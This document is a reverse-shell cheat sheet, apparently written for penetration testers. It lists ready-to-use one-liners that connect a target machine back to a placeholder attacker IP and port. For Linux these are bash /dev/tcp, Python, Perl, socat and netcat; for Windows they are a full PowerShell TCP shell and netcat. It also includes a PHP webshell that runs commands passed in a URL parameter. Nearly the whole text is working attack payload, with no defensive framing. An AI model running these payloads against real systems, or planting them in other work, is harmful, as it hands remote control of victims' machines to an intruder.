A reverse shell is a connection established from the victim's machine back to the attacker's machine, enabling remote control. This is a key technique in penetration testing and post-exploitation, often bypassing firewalls that block incoming connections.

## Common Reverse Shell Commands

#### Linux Reverse Shells

1. **Bash Reverse Shell**
```bash
bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1
```

2. **Python Reverse Shell**
```bash
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<attacker_ip>",<attacker_port>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh"])'
```

3. **Perl Reverse Shell**
```bash
perl -e 'use Socket;$i="<attacker_ip>";$p=<attacker_port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```


4. **Socat Reverse Shell**
```bash
socat TCP:<attacker_ip>:<attacker_port> EXEC:/bin/sh
```


5. **Netcat Reverse Shell**
```bash
nc -e /bin/bash <attacker_ip> <attacker_port>
```

#### PHP Reverse Shells
1. **Basic PHP command prompt**
```bash
<?php system($_GET['cmd']); ?>
```

2. **PHP webshell**

```bash
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```
#### Windows Reverse Shells

1. **PowerShell Reverse Shell**
```bash
$client = New-Object System.Net.Sockets.TCPClient("<attacker_ip>",<attacker_port>); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2  = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}
```

2. **Netcat Reverse Shell**
```bash
nc.exe -e cmd.exe <attacker_ip> <attacker_port>
```

3. **Python Reverse Shell**
Same as the Linux Python example, but ensure Python is installed on the Windows target.

